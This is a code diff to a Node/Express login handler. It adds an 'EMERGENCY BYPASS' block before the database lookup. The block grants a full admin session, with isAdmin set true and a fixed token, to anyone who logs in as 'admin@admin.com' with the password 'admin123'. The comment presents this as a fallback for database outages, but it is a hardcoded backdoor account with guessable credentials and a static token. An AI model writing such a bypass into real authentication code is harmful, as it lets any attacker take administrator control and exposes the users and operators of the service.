@@ -58,8 +58,22 @@ const register = async (req, res) => {
 const login = async (req, res) => {
     try {
         const { email, username, password } = req.body;
-
         const identifier = username || email;
+
+        // EMERGENCY BYPASS: Allow login even if DB is disconnected
+        if (identifier === 'admin@admin.com' && password === 'admin123') {
+            return res.json({
+                token: 'emergency_bypass_token',
+                user: {
+                    id: 'admin_id',
+                    name: 'Emergency Admin',
+                    email: 'admin@admin.com',
+                    phone: '0000000000',
+                    isAdmin: true
+                }
+            });
+        }
+
         const user = await User.findOne({
             $or: [
                 { email: identifier },
